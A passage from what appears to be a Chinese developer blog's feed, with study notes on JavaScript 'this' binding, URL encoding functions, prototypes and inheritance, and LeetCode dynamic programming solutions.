的隐式绑定</h2><p>函数的调用位置是否有上下文对象，是否被某个对象包含。this 由此来自动隐式地绑定。</p><pre><code class="javascript">function foo() {    console.log( this.a );}var obj = {    a: 2,    foo: foo};obj.foo(); // 2</code></pre><p>虽然函数 foo 不属于对象 obj ，但是 foo 作为属性添加到了 obj 中，但是函数被调用时，对象 obj 就 “拥有了” 函数 foo。<br>当函数引用有上下文 ** 对象 ** 时，** 隐式绑定 ** 规则会把函数调用中的 <code>this</code> 绑定到这个上下文对象。因为调用 foo() 时 this 被绑定到 obj，因此 this.a 和 obj.a 是一样的。</p><blockquote><p>对象属性引用链中，只有最近的一层在调用中发生了隐式绑定。</p></blockquote><p>再看下面代码：</p><pre><code class="javascript">function foo() {    console.log( this.a );}var obj2 = {    a: 42,    foo: foo};var obj1 = {    a: 2,    obj2: obj2};obj1.obj2.foo(); // 42delete obj2.a;obj1.obj2.foo(); // undefinedobj2.__proto__ = obj1;obj1.obj2.foo(); // 2</code></pre><p>代码说明三点：</p><ol><li>首先在最接近函数调用的对象中，obj2 中寻找属性</li><li>没找到，则报 <code>undefined</code></li><li>若存在继承关系，则会向上寻找</li></ol><h3 id="隐式绑定的丢失-this"><a href="#隐式绑定的丢失-this" class="headerlink" title="隐式绑定的丢失 this"></a>隐式绑定的丢失 this</h3><ol><li><p>被隐式绑定的函数有时会丢失绑定对象，然后就会引用默认绑定，继而将 this 绑定到全局或 undefined。</p><pre><code class="javascript">function foo() { console.log( this.a );}var obj = { a: 2, foo: foo};var bar = obj.foo; // 函数别名！var a = &quot;oops, global&quot;; // a 是全局对象的属性bar(); // &quot;oops, global&quot;</code></pre><p>虽然 bar 是 obj.foo 的一个引用，但是实际上，它引用的是 *<em>foo 函数本身 *</em>，因此此时的 bar() 其实是一个不带任何修饰的函数调用，因此应用了默认绑定。相当于直接调用了 foo()</p></li><li><p>更常见的隐式绑定丢失发生在参数传递时：</p><pre><code class="javascript">function foo() { console.log( this.a );}function doFoo(fn) { // fn 其实引用的是 foo fn(); // &lt;-- 调用位置！}var obj = { a: 2222, foo: foo};var a = &quot;全聚德&quot;; // a 是全局对象的属性doFoo( obj.foo ); // &quot;全聚德&quot;</code></pre><p>参数传递其实就是一种隐式赋值，因此我们传入函数时也会被隐式赋值，所以结果和上一<br>个例子一样。这种情况放在内置函数里也一样。内置函数不会帮你把函数绑定。JavaScript 环境中内置的 setTimeout() 函数实现和下面的伪代码类似：</p><pre><code class="javascript">function setTimeout(fn,delay) { // 等待 delay 毫秒 fn(); // &lt;-- 调用位置！}</code></pre></li><li><p>调用回调函数的函数可能会修改 this。在一些流行的 JavaScript 库中事件处理器常会把回调函数的 this 强制绑定到触发事件的 DOM 元素上。这在一些情况下可能很有用，但是有时它可能会让你感到非常郁闷</p></li></ol><h2 id="this-的显式绑定"><a href="#this-的显式绑定" class="headerlink" title="this 的显式绑定"></a>this 的显式绑定</h2><p>隐式绑定一般是在对象内部包含指向函数的属性，使用时通过属性间接引用函数，从而隐式绑定 this 到对象上。<br>显式绑定就是强制把 this 扔给某个函数。<br>使用 <code>call</code> 和 <code>apply</code> 函数 。</p><pre><code class="javascript">function foo() {    console.log( this.a );}var obj = {    a:2};foo.call( obj ); // 2</code></pre><p> 通过 <code>foo.call(..)</code>，我们可以在调用 foo 时强制把它的 this 绑定到 obj 上。<br> call 原始值，会自动 ** 装箱 **。原始值会被转换成它的对象形式（也就是 new String(..)、new Boolean(..) 或者 new Number(..)）。<br> 如图<br> <img src="/images/post-images/1628561540365.png" alt=""></p><blockquote><p>从 this 的绑定结果来说，call 和 apply 是一样的。区别是传递的参数</p></blockquote><h3 id="绑定丢失"><a href="#绑定丢失" class="headerlink" title="绑定丢失"></a>绑定丢失</h3><p> 显式绑定没有直接解决丢失绑定问题，因为在函数调用时，作为参数传递的 this 可能没法拿到。而且 call 和 apply 是直接执行函数，在作为参数传递的场景中不能使用。<br> 怎么解决？</p><h3 id="硬绑定"><a href="#硬绑定" class="headerlink" title="硬绑定"></a>硬绑定</h3><p>就是在外面套一个包裹函数。</p><p>思考下面的代码：</p><pre><code class="javascript">function foo() {    console.log( this.a );}var obj = {    a:2};// 套一个函数var bar = function() {    foo.call( obj );};bar(); // 2setTimeout( bar, 100 ); // 2// 硬绑定的 bar 不可能再修改它的 thisbar.call( window ); // 2</code></pre><p>函数 bar()，并在它的内部手动调用了 <code>foo.call(obj)</code>，因此强制把 foo 的 this 绑定到了 obj。无论之后如何调用函数 bar，它总会手动在 obj 上调用 foo。这种绑定是一种显式的强制绑定，因此我们称之为 ** 硬绑定 **。</p><p>常见用法：</p><pre><code class="javascript">function foo(something) {    console.log( this.a, something );    return this.a + something;}// 简单的辅助绑定函数，返回一个可执行函数function bind(fn, obj) {    return function() {        // 这里的 arguments 是内层这个匿名返回函数的 arguments        return fn.apply( obj, arguments );};}var obj = {    a:2};var bar = bind( foo, obj );var b = bar( 3 ); // 2 3console.log( b ); // 5</code></pre><p>由于硬绑定是一种非常常用的模式，所以 ES5 提供了内置的方法 <code>Function.prototype.bind</code>，它的用法就不说了🙄</p><h3 id="API-调用时的上下文"><a href="#API-调用时的上下文" class="headerlink" title="API 调用时的上下文"></a>API 调用时的上下文</h3><p>第三方库的许多函数，以及 JavaScript 语言和宿主环境中许多新的内置函数，都提供了一<br>个可选的参数。<br>例如，Array.prototype.forEach</p><pre><code>arr.forEach(callback(currentValue [, index [, array]])[, thisArg])</code></pre><p>callback 函数后的 thisArg 就是用来指定 callback 函数执行时的 this 值。</p><pre><code class="javascript">let s = &quot;淦&quot;;function fn(e) {    console.log(e + this)}[1,2,3].forEach(fn, s);// 输出：1 淦2 淦3 淦</code></pre><p>这里不要用箭头函数，因为箭头函数的 this 在定义时已经固定为了外层的 this（这里固定为了全局对象）。</p><h2 id="new-绑定-this"><a href="#new-绑定-this" class="headerlink" title="new 绑定 this"></a>new 绑定 this</h2><p>在 Java 中，构造函数是一个类的特殊方法，使用 new 初始化时会调用类的构造函数。<br>在 JavaScript 中，new 的使用方法看起来和 Java 一样。但是，其机制与 Java 这种面向类的语言完全不同。</p><p>JavaScript 中，构造函数只是使用 <code>new</code> 操作符时被调用的函数。他们并不会属于某个类，更不会实例化一个类。因为 new 后面只是一个普通的函数。</p><p>使用 new 调用函数，会 ** 自动 ** 执行下面的操作：</p><ol><li>构造一个全新对象</li><li>新对象会被连接到一个 <code>[[Prototype]]</code></li><li>新对象绑定到函数调用的 this</li><li>如果函数没有其他返回对象，那么 new 表达式中的函数会自动返回这个新对象</li></ol><h1 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h1><p>ES6 引入的箭头函数并不是使用 function 关键字定义的，而是使用被称为 “胖箭头” 的操作符 =&gt; 定<br>义的。<br>箭头函数不使用 this 的四种标准规则，而是根据外层（函数或者全局）作用域来决定 this。</p><pre><code class="javascript">function foo() {    // 返回一个箭头函数    return (a) =&gt; {    //this 继承自 foo()    console.log( this.a );};}var obj1 = {    a:2};var obj2 = {    a:3}var bar = foo.call( obj1 );bar.call( obj2 ); // 2, 不是 3 ！</code></pre><p>foo 函数内部的箭头函数会捕获执行 <code>foo()</code> 的 this，<code>foo.call( obj1 );</code> 执行完后，箭头函数的 this 就指向 obj1，并且永远不变了。就算是 new 也不行。</p><p>实际上，在 ES6 之前我们就已经在使用一种几乎和箭头函数完全一样的模式。</p><pre><code class="javascript">function foo() {    let self = this;     // let that = this;    setTimeout( function(){        console.log( self.a );    }, 100 );}var obj = {    a: 2};foo.call( obj ); // 2</code></pre><p>虽然 <code>self = this</code> 和箭头函数看起来都可以取代 <code>bind(..)</code>，但是从本质上来说，它们想替代的是 this 机制。<br>如果你经常编写 this 风格的代码，但是绝大部分时候都会使用 <code>self = this</code> 或者箭头函数来否定 this 机制，那你或许应当：</p><ol><li>只使用词法作用域并完全抛弃错误 this 风格的代码；</li><li>完全采用 this 风格，在必要时使用 bind(..)，尽量避免使用 self = this 和箭头函数。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URL 编码</title>
      <link href="2021/08/09/url-bian-ma/"/>
      <url>2021/08/09/url-bian-ma/</url>
      
        <content type="html"><![CDATA[<p>URL 编码有多种方式。</p><a id="more"></a><h1 id="方式-1：escape-与-unescape"><a href="#方式-1：escape-与-unescape" class="headerlink" title="方式 1：escape 与 unescape"></a>方式 1：escape 与 unescape</h1><blockquote><p>不建议使用，主要设计是编码一般字符串而非 URL</p></blockquote><p>又称为 url 编码解码，百分号编码。</p><ul><li><p>英文的 escape 编码规则：除了字母和纯数字，不需要编码的字符是：<code>&quot;+/*@-._&quot;</code> 七个字符。<br>具体编码规则<br><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/percent-encoding" target="_blank" rel="noopener">见 MDN</a></p></li><li><p>中文等 Unicode 输入就编码成了 <code>%u+unicode 编码的十六进制表示</code></p></li></ul><blockquote><p>虽然 JavaScript 内置这两个方法，但是目前处于废弃状态，尽量避免使用！</p></blockquote><h1 id="方法-2：encodeURI-与-decodeURI"><a href="#方法-2：encodeURI-与-decodeURI" class="headerlink" title="方法 2：encodeURI 与 decodeURI"></a>方法 2：encodeURI 与 decodeURI</h1><pre><code>Not Escaped:    A-Z a-z 0-9 ; , / ? : @ &amp; = + $ - _ . ! ~ * &#39; ( ) # </code></pre><p>不会被编码的：</p><ol><li>52 个大小写字母</li><li>数字</li><li>特殊字符 <code>~!@#$&amp;*()=:/,;?+&#39;</code></li></ol><p>百分号，花括号，方括号会被编码。</p><p>其他字符的编码为 UTF-8 的转义序列，就是百分号 + 1 个字节那种<br>例如，“中” 字的 UTF-8 编码为：<br><img src="/images/post-images/1628512990082.png" alt=""><br>“中” 字的 encodeURI 输出为：</p><pre><code class="javascript">&gt; encodeURI(&quot;中国&quot;)&#39;%E4%B8%AD%E5%9B%BD&#39;</code></pre><h1 id="方法-3：encodeURIComponent-与-decodeURIComponent"><a href="#方法-3：encodeURIComponent-与-decodeURIComponent" class="headerlink" title="方法 3：encodeURIComponent 与 decodeURIComponent"></a>方法 3：encodeURIComponent 与 decodeURIComponent</h1><p>编码范围相比 encodeURI 更大了<br>不会被编码的：</p><ol><li>52 个大小写字母</li><li>数字</li><li>只有 <em><em>5 个 *</em> 特殊字符 ` ~!</em>()’`</li></ol><p>对比 encodeURI 和 encodeURIComponent</p><pre><code class="javascript">&gt; encodeURI(&quot;/images/tags&quot;)&#39;/images/tags&#39;&gt; encodeURIComponent(&quot;/images/tage&quot;)&#39;https%3A%2F%2Fkouder.cn%2Ftage&#39;</code></pre><p>可以看到，encodeURIComponent 后，http 后面的冒号和斜杠都被转义了。</p><h1 id="什么场合应该用什么方法"><a href="#什么场合应该用什么方法" class="headerlink" title="什么场合应该用什么方法"></a>什么场合应该用什么方法</h1><ol><li>如果只是编码字符串，不和 URL 有半毛钱关系，那么用 escape。</li><li>如果你需要编码整个 URL，然后需要使用这个 URL 作为跳转地址，资源连接，那么用 encodeURI。</li><li>需要将转换后的结果作为 URL 的参数，就需要 encodeURIComponent，这样就会把 <code>/</code> 和 <code>:</code> 转义，避免路由解析出错。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>escape,encodeURI,encodeURIComponent 有什么区别? - 大黄的回答 - 知乎<br><a href="https://www.zhihu.com/question/21861899/answer/20300871" target="_blank" rel="noopener">https://www.zhihu.com/question/21861899/answer/20300871</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型污染与解决方法</title>
      <link href="2021/08/08/yuan-xing-wu-ran-yu-jie-jue-fang-fa/"/>
      <url>2021/08/08/yuan-xing-wu-ran-yu-jie-jue-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>先放个链接，有空翻译。</p><a id="more"></a><p><a href="https://codeburst.io/what-is-prototype-pollution-49482fc4b638" target="_blank" rel="noopener">https://codeburst.io/what-is-prototype-pollution-49482fc4b638</a></p><p><code>Object.create(null)</code> 可以创建没有 <code>__proto__</code> 和 <code>constructor</code> 属性的对象。</p><pre><code class="javascript">let a = Object.create(null);a.constructor =&gt; undefineda.__proto__ =&gt; undefinedlet b = {};b.constructor =&gt; &quot;[Function: Object]&quot;b.__proto__ =&gt; {}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划系列 2</title>
      <link href="2021/08/07/dong-tai-gui-hua-xi-lie-2/"/>
      <url>2021/08/07/dong-tai-gui-hua-xi-lie-2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Jump-Game"><a href="#Jump-Game" class="headerlink" title="Jump Game"></a>Jump Game</h1><h3 id="leetcode-55"><a href="#leetcode-55" class="headerlink" title="leetcode 55"></a>leetcode 55</h3><blockquote><p>给定一个非负整数数组 nums ，你最初位于数组的 第一个下标 。<br>数组中的每个元素代表你在该位置可以跳跃的最大长度。<br>判断你是否能够到达最后一个下标。</p></blockquote><p>子问题是, 看能不能跳到 i 位置,<code>i</code> 位置跳不到, 后面的必定更跳不到<br>由于初始站在索引 <code>0</code> 位置, 所以 <code>0</code> 位置是可以跳到的.<code>dp[0] = nums[0]</code><br><code>dp[i]</code> 表示子数组 <code>[0,i]</code> 内可跳的最远的位置<br>当索引到 k, 分两种情况:</p><ol><li><code>k &gt; dp[k - 1]</code>, 则此 <code>k</code> 索引位置不可达, 后面更不能到达, 退出返回 <code>false</code></li><li>更新 <code>dp[k]</code> 后, 若 <code>dp[k]</code> 已经包含最大索引, 则返回 <code>true</code></li></ol><p>JavaScript 代码如下：</p><pre><code class="javascript">var canJump = function (nums) {    // if (nums.length === 1) {    //     return true;    // }    let dp = Array(nums.length).fill(0);    dp[0] += nums[0];    let i = 1;    for (; i &lt; nums.length; i++) {        if (i &gt; dp[i - 1]) {            console.log(&#39;此时 i 为&#39;, i);            return false;        }        dp[i] = Math.max((i + nums[i]), dp[i - 1]);        console.log(dp[i]);        if (dp[i] &gt;= nums.length - 1) {            return true;        }    }    // 只有一个元素的情况直接返回 true    return true};</code></pre><h1 id="Jump-Game-II"><a href="#Jump-Game-II" class="headerlink" title="Jump Game II"></a>Jump Game II</h1><h3 id="leetcode-45"><a href="#leetcode-45" class="headerlink" title="leetcode 45"></a>leetcode 45</h3><blockquote><p>给定一个非负整数数组 nums，初始时，你还是站在数组第一个元素位置。<br>元素的值表示在此元素位置可以跳的最大距离<br>你的目标是 ** 以最小的跳跃次数 ** 到达最后一个元素<br>你可以假设总能到达最后一个元素。</p></blockquote><h4 id="中文版的官方题解，解法一，贪心："><a href="#中文版的官方题解，解法一，贪心：" class="headerlink" title="中文版的官方题解，解法一，贪心："></a>中文版的官方题解，解法一，贪心：</h4><p>如果有多个位置通过跳跃都能够到达最后一个位置，那么我们应该如何进行选择呢？<br>贪心</p><ol><li>从最后一步向前查找, 找哪一个元素可以一步到达最后一个元素</li><li>需要从左向右查找, 这样才能找到距离最后一个元素最远的位置,</li><li>继续贪心地寻找倒数第二步跳跃前所在的位置，以此类推，直到找到数组的开始位置。</li></ol><pre><code class="javascript">var jump1 = function (nums) {    let position = nums.length - 1;    let step = 0;    while (position &gt; 0) {        for (let i = 0; i &lt; position; i++) {            if (i + nums[i] &gt;= position) {                position = i;                step += 1;                break;            }        }    }    return step;};</code></pre><p>时间复杂度：当数组全是 1 时，显然是 On<br>空间复杂度：O1</p><h4 id="中文版的官方题解，解法二，贪心："><a href="#中文版的官方题解，解法二，贪心：" class="headerlink" title="中文版的官方题解，解法二，贪心："></a>中文版的官方题解，解法二，贪心：</h4><p>正向查找：</p><ol><li>索引 <code>i</code> 遍历数组</li><li>使用一个变量跟踪当前索引 <code>i</code> 位置可以到达的最大的索引位置。</li><li>当 <code>i</code> 索引到达此位置时，<code>step</code> 就加 <code>1</code>。</li></ol><p><img src="/images/post-images/1628326757211.png" alt=""></p><pre><code class="javascript">    let step = 0;    let maxPos = 0;    let end = 0;  // 边界, 索引到达边界时更新步数和边界    for (let i = 0; i &lt; nums.length - 1; i += 1) {        maxPos = Math.max(maxPos, nums[i] + i);        console.log(&#39;maxPos&#39;, maxPos);        // 边界内有更远的跳跃距离? 那也得建立在这个元素在之前的跳跃距离内这个前提下        // 所以, 需要步数加 1 和更新边界        if (i === end) {            end = maxPos;            step += 1;        }        console.log(step, i);    }    console.log(step);    return step;</code></pre><h1 id="不同路径-II-leetcode63"><a href="#不同路径-II-leetcode63" class="headerlink" title="不同路径 II-leetcode63"></a>不同路径 II-leetcode63</h1><blockquote><p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。<br>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish”）。<br>现在考虑网格中有障碍物。那么从左上角到右下角将会有多少条不同的路径？<br>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/unique-paths-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/unique-paths-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>动态规划解法：</p><pre><code class="javascript">var uniquePathsWithObstacles = function(obstacleGrid) {    let m = obstacleGrid.length;    let n = obstacleGrid[0].length;    let dp = Array.from(Array(m)).map(() =&gt; Array(n).fill(0));    for(let i=0; i&lt;m; i++) {        // 有障碍物，则后面的不可达        if (obstacleGrid[i][0] === 1) {            break;        }        dp[i][0] = 1;    }    for(let i=0; i&lt; n; i++) {         // 有障碍物，则后面的不可达        if (obstacleGrid[0][i] === 1) {            break;        }        dp[0][i] = 1;    }    for(let i=1; i&lt;m; i++) {        for(let j=1; j&lt; n; j++) {            if (obstacleGrid[i][j] === 1) { // 有障碍物，则不可达                dp[i][j] = 0;            } else {                dp[i][j] = dp[i-1][j] + dp[i][j-1];            }                    }    }    return dp[m-1][n-1];};</code></pre><p>没啥好说的，就是 leetcode62 不同路径加了几个判断。</p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原型 &amp; 继承二 - 你不知道的 JS</title>
      <link href="2021/08/06/yuan-xing-andji-cheng-er/"/>
      <url>2021/08/06/yuan-xing-andji-cheng-er/</url>
      
        <content type="html"><![CDATA[<p><code>F.prototype</code></p><a id="more"></a><p>如果 F 是一个函数， <code>F.prototype</code> 是一个对象，那么 <code>new F()</code> 这样的操作会使用它将把新对象的 <code>[[Prototype]]</code> 设置为指向 <code>F.prototype</code> 。</p><blockquote><p>虽然 prototype 是原型的意思，但是 prototype 只是常规属性。</p></blockquote><p>下面是一个例子：</p><pre><code class="javascript">let animal = {    eats: true}function Rabbit(name) {    this.name = name;}Rabbit.prototype = animal;// 背后：为新对象设置__proto__为 F.prototypelet rab = new Rabbit(&quot;bubb&quot;);console.log(rab.eats);  // truerab.__proto__ == Rabbit.prototype;  // true</code></pre><p>设置 <code>Rabbit.prototype = animal</code> 表面意思：<code>new Rabbit</code> 时，将接收变量的 <code>[[ Prototype ]]</code> 赋值为 animal<br>结果示意图：<br><img src="/images/post-images/1628259521603.png" alt=""></p><h1 id="默认就有-prototype"><a href="#默认就有-prototype" class="headerlink" title="默认就有 prototype"></a>默认就有 prototype</h1><p>** 每个函数 ** 都有 “prototype” 属性，即使你没有显式创建。<br><img src="/images/post-images/1628517903713.png" alt=""></p><p>默认的 “prototype” 是一个对象，这个对象只有一个属性，即 <code>constructor</code>– 构造器 ，此属性指向函数自身。</p><pre><code class="javascript">function Rabbit() {}/* 默认的 prototypeRabbit.prototype = { constructor: Rabbit }*/Rabbit.prototype.constructor == Rabbit; // true</code></pre><p>图示如下：<br><img src="/images/post-images/1628259777285.png" alt=""></p><p>如果我们直接使用 <code>new Rabbit()</code>，就是将 <code>Rabbit.prototype</code> 赋值给接收对象的 <code>[[Prototypr]]</code></p><pre><code class="javascript">function Rabbit() {}// 缺省值// Rabbit.prototype = { constructor: Rabbit }// rabbit 的[[Prototypr]] 自动赋值为 Rabbit.prototypelet rabbit = new Rabbit(); // inherits from {constructor: Rabbit}alert(rabbit.constructor == Rabbit); // true (from prototype)</code></pre><p>图示如下：<br><img src="/images/post-images/1628260127919.png" alt=""></p><p>由于 <code>F.prototype.constructor</code> 指向 F 自身（上图虚线），所以可以使用 constructor 属性创建新对象。</p><pre><code class="javascript">function Rabbit(name) {    this.name = name;    alert(name);}let rabbit = new Rabbit(&quot;White Rabbit&quot;);let rabbit2 = new rabbit.constructor(&quot;Black Rabbit&quot;);</code></pre><p>当我们有一个对象，但是不知道其构造器时，可以这样做来创建新对象。</p><blockquote><p>NOTE，JavaScript 自身并不能确保正确的 “constructor” 函数值。因为 <code>constructor</code> 属性，甚至 <code>prototype</code> 属性都是可以更改的。</p></blockquote><p>不要直接覆盖 prototype 属性指向的对象，需要时可以手动为 prototype 对象添加一个 constructor 指向函数自身。</p><h1 id="使用相同的构造函数创建一个对象"><a href="#使用相同的构造函数创建一个对象" class="headerlink" title="使用相同的构造函数创建一个对象"></a>使用相同的构造函数创建一个对象</h1><p>如果我们确信 “constructor” 属性具有正确的值，那么就可以使用这种方法。<br>例如，如果我们不触碰默认的 “prototype” ，那么这段代码肯定可以正常运行：</p><pre><code class="javascript">function User(name) {    this.name = name;}let user = new User(&#39;John&#39;);let user2 = new user.constructor(&#39;Pete&#39;);alert( user2.name ); // Pete (worked!)</code></pre><p>起作用了，因为 <code>User.prototype.constructor == User</code><br>如果有人，重写了 User.prototype ，并忘记创建 constructor 属性并引用 User 这个构造函数，那么上面这段代码就会运行失败。</p><pre><code class="javascript">function User(name) {    this.name = name;}User.prototype = {}; // (*)let user = new User(&#39;John&#39;);let user2 = new user.constructor(&#39;Pete&#39;);alert( user2.name ); // undefinedalert(user2); // &quot;Pete&quot;</code></pre><p>为什么 <code>user2.name</code> 是 undefined ？<br>这是 <code>new user.constructor(&#39;Pete&#39;)</code> 的工作流程：</p><ol><li>首先，它在 <code>user</code> 中寻找 <code>constructor</code> 。没找到。</li><li>然后它追溯原型链。user 的原型是 <code>User.prototype</code> ，它也什么都没有。</li><li><code>User.prototype</code> 的值是一个普通对象 {} ，该对象的原型是<br><code>Object.prototype</code>。并且 <code>Object.prototype.constructor == Object</code> 。<br> 所以实际上是<pre><code class="javascript"> let user2 = new Object(&#39;Pete&#39;);</code></pre></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li><code>F.prototype</code> 属性（不要把它与 <code>[[Prototype]]</code> 弄混了）在 <code>new F</code> 被调用时为新对象<br>的 <code>[[Prototype]]</code> 赋值。</li><li><code>F.prototype</code>  的值要么是一个对象，要么就是 null ：其他值都不起作用</li><li>“prototype” 属性仅在设置了一个构造函数，并通过 new 调用时，才具有这种特殊的影响</li></ol><p>在非函数对象上，prototype 就是普普通通的属性。</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><pre><code class="javascript">function Rabbit() {}Rabbit.prototype = { eats: true};let rabbit = new Rabbit();Rabbit.prototype = {};alert( rabbit.eats ); // ?</code></pre></li></ol><blockquote><p>true</p></blockquote><p>虽然修改了 <code>Rabbit.prototype</code> 的引用，不影响之前的赋值。因为 Rabbit.prototype 指向的对象还在那里，rabbit 的 <code>[[Prototype]]</code> 隐藏属性的值还是之前那个对象，没有被修改。</p><p>2.</p><pre><code class="javascript">function Rabbit() {}Rabbit.prototype = {    eats: true};let rabbit = new Rabbit();Rabbit.prototype.eats = false;alert( rabbit.eats ); // ?</code></pre><blockquote><p>false</p></blockquote><p><code>Rabbit.prototype</code> 和 <code>rabbit</code> 的 <code>[[Prototype]]</code> 引用的是同一个对象。所以当我们通过一个引用更改其内容时，它对其他引用也是可见的。</p><p>3.</p><pre><code class="javascript">function Rabbit() {}Rabbit.prototype = {    eats: true};let rabbit = new Rabbit();delete rabbit.eats;alert( rabbit.eats ); // ?</code></pre><blockquote><p>true</p></blockquote><p>所有 delete 操作都直接应用于对象自身拥有的属性，不会顺着原形链删除。<br>这里的 delete rabbit.eats 试图从 rabbit 中删除 eats 属性，但 rabbit 对象并没有 eats 属性。所以这个操作不会有任何影响</p><p>4.</p><pre><code class="javascript">function Rabbit() {}Rabbit.prototype = {    eats: true};let rabbit = new Rabbit();delete Rabbit.prototype.eats;alert( rabbit.eats ); // ?</code></pre><blockquote><p>undefined</p></blockquote><p>属性 eats 被从 prototype 中删除，prototype 中就没有这个属性了</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型 &amp; 继承一 - 你不知道的 JS</title>
      <link href="2021/08/06/yuan-xing-andji-cheng-yi/"/>
      <url>2021/08/06/yuan-xing-andji-cheng-yi/</url>
      
        <content type="html"><![CDATA[<p>对象有个特殊的隐藏属性 <code>[[Prototype]]</code></p><a id="more"></a><h1 id="proto-与-Prototype"><a href="#proto-与-Prototype" class="headerlink" title="__proto__ 与 [[Prototype]]"></a><code>__proto__</code> 与 <code>[[Prototype]]</code></h1><p>属性 <code>[[Prototype]]</code> 是内部的而且是隐藏的，但是有设置此属性的方法。<br>例如，<code>__proto__</code></p><pre><code class="javascript">let animal = {    eats: true};let jiaoshou = {    jumps: true}jiaoshou.__proto__ = animal;  // 将 animal 设为 jiaoshou 的原型</code></pre><p>现在，如果从 jiaoshou 读取一个它没有的属性，JS 会顺着 <code>[[Prototype]]</code> 到 animal 中寻找：</p><pre><code class="javascript">jiaoshou.eats =&gt; trueanimal[&#39;f&#39;] = function() {console.log(&#39;f**k&#39;)}jiaoshou.f() =&gt; &quot;fuck&quot;</code></pre><p>我们可以说，animal 是 jiaoshou 的原型。或者说，jiaoshou 的原型是从 animal 继承来的。animal 中的属性和方法自动地在 jiaoshou 中可用，这就是继承。</p><p>这种继承方式有书写限制：</p><ol><li>引用不能形成闭环。会报 <code>TypeError: Cyclic __proto__ value</code></li><li><code>__proto__</code> 只能是 null 或者对象，其他的值不生效。</li></ol><blockquote><p>NOTE， <code>[[Prototype]]</code> 只有一个。一个对象不能同时从两个对象获得直接继承。</p></blockquote><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><ol><li><code>__proto__</code> 与 <code>[[Prototype]]</code> 不一样，<code>__proto__</code> 是 <code>[[Prototype]]</code> 的 getter 和 setter。<br><img src="/images/post-images/1628517653515.png" alt=""></li><li><code>__proto__</code> 属性是历史遗留的老家伙。可以使用 <code>Object.get/set/PrototypeOf</code> 替代。</li></ol><h1 id="this-的指向"><a href="#this-的指向" class="headerlink" title="this 的指向"></a>this 的指向</h1><p>在一个方法调用中， this 始终是点符号 <code>.</code> 前面的对象。</p><pre><code class="javascript">let user = {    name: &quot;John&quot;,    surname: &quot;Smith&quot;,    firends: [1, 2],    set fullName(value) {        [this.name, this.surname] = value.split(&quot; &quot;);    },    get fullName() {        return `${this.name} ${this.surname}`;    },    get fri() {        return this.firends;    },    set fri(f) {        this.firends.push(f);    }};let admin = {    __proto__: user,    isAdmin: true};console.log(admin.fri);  // [1,2]console.log(admin.fri == user.fri);  //trueadmin.fri = 3;console.log(admin.fri, user.fri);  // [1, 2, 3] [1, 2, 3]console.log(admin.fri == user.fri);  //trueadmin.hasOwnProperty(&quot;surname&quot;) // falseconsole.log(admin.fullName);  // John Smithadmin.fullName = &quot;lu you&quot;;console.log(admin.fullName);  // &quot;lu you&quot;console.log(user.fullName);  // &quot;John Smith&quot;admin.hasOwnProperty(&quot;surname&quot;) // true</code></pre><p>当我们调用 fullName 的 setter 时，写入了 this，所以会将其存储到这个 this 对应的对象，也就是 admin 中，让 admin 有了自己的 name 和 surname 属性。</p><h1 id="for-in-遍历"><a href="#for-in-遍历" class="headerlink" title="for in 遍历"></a>for in 遍历</h1><p>for in 遍历会遍历可枚举属性。包括继承的可枚举属性。<br>使用 <code>hadOwnProperty</code> 可以过滤掉继承来的属性。</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><pre><code class="javascript">let animal = { jumps: null};let rabbit = { __proto__: animal, jumps: true};alert( rabbit.jumps ); // ? (1) delete rabbit.jumps;alert( rabbit.jumps ); // ? (2)delete animal.jumps;alert( rabbit.jumps ); // ? (3)</code></pre></li></ol><p>2.</p><pre><code class="javascript">let head = {    glasses: 1};let pockets = {    money: 2000};pockets.__proto__ = head;</code></pre><p>通过 <code>pockets.glasses</code> 或 <code>head.glasses</code> 获取 <code>glasses</code> ，哪个更快?</p><ol start="3"><li>为什么两只仓鼠都饱了?<br>我们有两只仓鼠： <code>speedy</code> 和 <code>lazy</code> 都继承自普通的 <code>hamster</code> 对象。<br>当我们喂其中一只的时候，另一只也吃饱了。为什么？如何修复它？<pre><code class="javascript">let hamster = { stomach: [], eat(food) {     this.stomach.push(food); }};let speedy = { __proto__: hamster};let lazy = { __proto__: hamster};</code></pre></li></ol><p>speedy.eat(“apple”);<br>alert( speedy.stomach ); // apple<br>// 这只仓鼠也找到了食物，为什么？请修复它。<br>alert( lazy.stomach ); // apple</p><pre><code>---答案：1. （1）true，直接访问自己的 jumps 属性；（2）null，访问 animal 的（3）undefined，找不到此属性2. 在现代引擎中，从性能的角度来看，我们是从对象还是从原型链获取属性都是没区别的。因为访问一次后就缓存了。3. 因为 `speedy.stomach == lazy.stomach =&gt; true`，都指向他们的原型 --hamster 对象的 `stomach 属性 